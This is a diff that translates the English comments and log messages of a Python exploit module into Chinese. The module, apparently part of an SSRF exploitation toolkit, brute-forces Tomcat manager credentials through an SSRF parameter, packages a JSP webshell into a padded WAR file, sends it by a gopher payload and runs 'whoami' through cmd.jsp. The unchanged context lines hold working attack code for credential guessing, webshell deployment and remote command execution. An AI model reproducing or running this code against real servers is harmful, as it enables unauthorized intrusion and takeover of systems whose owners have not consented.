@@ -10,13 +10,13 @@ import zipfile
 
 from core.utils import *
 
-# NOTE
-# This exploit is a Python 3 version of Pimps script
-# with a simple bruteforcer and auto exploiter
+# 注意
+# 此利用代码是 Pimps 脚本的 Python 3 版本
+# 附带一个简单的爆破器和自动利用器
 # https://github.com/pimps/gopher-tomcat-deployer
 
 name = "tomcat"
-description = "Tomcat - Bruteforce manager and WAR uploader"
+description = "Tomcat - 爆破管理后台并上传 WAR 包"
 author = "Swissky"
 documentation = [
     "https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html",
@@ -50,10 +50,10 @@ class exploit:
     ]
 
     def __init__(self, requester, args):
-        logging.info(f"Module '{name}' launched !")
+        logging.info(f"模块 '{name}' 已启动！")
         self.args = args
 
-        # Using a generator to create the host list
+        # 使用生成器创建主机列表
         gen_host = gen_ip_list(self.SERVER_HOST, args.level)
         for ip in gen_host:
             for usr in self.tomcat_user:
@@ -64,22 +64,21 @@ class exploit:
                     r = requester.do_request(args.param, payload)
 
                     if r != None and not "s3cret" in r.text:
-                        logging.info(f"Found credential \033[32m{usr}\033[0m:\033[32m{pss}\033[0m")
+                        logging.info(f"发现凭据 \033[32m{usr}\033[0m:\033[32m{pss}\033[0m")
                         self.SERVER_USER = usr
                         self.SERVER_PASS = pss
 
-                        # bruteforce padding for a good zip file
-                        # worst solution until I find an alternate
-                        # way to convert the is_ascii from the original
-                        # Python 2 payload
+                        # 为生成合法的 zip 文件而进行爆破填充
+                        # 这是最差的方案，直到我找到替代方法
+                        # 来转换原始 Python 2 payload 中的 is_ascii
                         for i in range(5):
                             payload = self.send_war(i)
                             r = requester.do_request(args.param, payload)
 
                             if args.verbose == True:
-                                logging.info(f"Generated payload : {payload}")
+                                logging.info(f"生成的 payload : {payload}")
 
-                            logging.info(f"Sending CMD to cmd.jsp for padding: {i}")
+                            logging.info(f"向 cmd.jsp 发送 CMD 命令以进行填充: {i}")
                             payload = wrapper_http(
                                 "cmd/cmd.jsp?cmd=whoami", self.SERVER_HOST, self.SERVER_PORT
                             )
@@ -94,21 +93,21 @@ class exploit:
             webshell_data = self.validate_webshell_length_and_crc32(webshell_data + " " * padding)
 
             if self.args.verbose == True:
-                logging.info("[+] Creating new zip file: " + self.EXPLOIT_WAR)
+                logging.info("[+] 正在创建新的 zip 文件: " + self.EXPLOIT_WAR)
             self.create_war_zip_file(self.EXPLOIT_WAR, self.EXPLOIT_JSP, webshell_data)
 
             if self.args.verbose == True:
-                logging.info("[+] Valid WAR file generated... Creating the gopher payload now...")
+                logging.info("[+] 已生成有效的 WAR 文件... 正在构造 gopher payload...")
             gopher_payload = self.build_gopher_payload()
 
             return wrapper_gopher(gopher_payload, self.SERVER_HOST, self.SERVER_PORT)
 
     def create_war_zip_file(self, war_filename, inputfile, webshell_data):
         warzip = zipfile.ZipFile(war_filename, "w")
-        # Write a known good date/war_filename stamp
-        # this date/time does not contain and invalid byte values
+        # 写入一个已知安全的时间戳/文件名
+        # 该日期时间不包含任何无效字节值
         info = zipfile.ZipInfo(inputfile, date_time=(1980, 1, 1, 0, 0, 0))
-        # Write out the webshell the zip file.
+        # 将 webshell 写入 zip 文件。
         warzip.writestr(info, webshell_data)
         warzip.close()
 
@@ -118,9 +117,9 @@ class exploit:
         modded_length = 0
 
         if self.args.verbose == True:
-            logging.info(f"Original file length: {len(webshell_data):08X}")
+            logging.info(f"原始文件长度: {len(webshell_data):08X}")
             logging.info(
-                f"Original file crc32: {binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF:x}"
+                f"原始文件 crc32: {binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF:x}"
             )
 
         while valid_length == 0 or valid_crc32 == 0:
@@ -145,14 +144,14 @@ class exploit:
                     continue
 
         if modded_length > 0:
-            logging.info("The input file CRC32 or file length contained an invalid byte.")
+            logging.info("输入文件的 CRC32 或文件长度包含无效字节。")
             logging.info(
-                "Length adjustment completed. "
+                "长度调整完成。"
                 + str(modded_length)
-                + " whitespace ' ' chars were added to the webshell input."
+                + " 个空格字符已添加到 webshell 输入中。"
             )
-            logging.info(f"New file length: {len(webshell_data):08X}")
-            logging.info(f"New file crc32: {binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF:x}")
+            logging.info(f"新文件长度: {len(webshell_data):08X}")
+            logging.info(f"新文件 crc32: {binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF:x}")
         return webshell_data
 
     def url_encode_all(self, string):
